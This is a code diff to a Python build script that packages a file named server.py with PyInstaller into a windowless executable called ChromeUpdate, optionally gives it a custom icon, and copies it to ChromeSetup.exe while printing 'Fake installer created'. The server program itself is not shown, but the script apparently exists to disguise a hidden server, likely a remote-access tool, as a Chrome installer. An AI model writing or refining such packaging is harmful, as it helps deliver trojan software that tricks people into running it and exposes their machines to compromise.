@@ -20,14 +20,19 @@ def install_pyinstaller():
 
 def build_server_exe():
     print("Building server executable...")
-    
+
     cmd = [
         'pyinstaller',
         '--onefile',
         '--noconsole', 
         '--name', 'ChromeUpdate',
-        'server.py'
     ]
+
+    if os.path.exists('icon.ico'):
+        cmd.extend(['--icon', 'icon.ico'])
+        print("Using icon.ico")
+    
+    cmd.append('server.py')
     
     try:
         result = subprocess.run(cmd, capture_output=True, text=True)
@@ -35,8 +40,8 @@ def build_server_exe():
             print("Build successful: dist/ChromeUpdate.exe")
             
             if os.path.exists("dist/ChromeUpdate.exe"):
-                shutil.copy2("dist/ChromeUpdate.exe", "Chrome_Setup.exe")
-                print("Fake installer created: Chrome_Setup.exe")
+                shutil.copy2("dist/ChromeUpdate.exe", "ChromeSetup.exe")
+                print("Fake installer created: ChromeSetup.exe")
             return True
         else:
             print("Build failed")
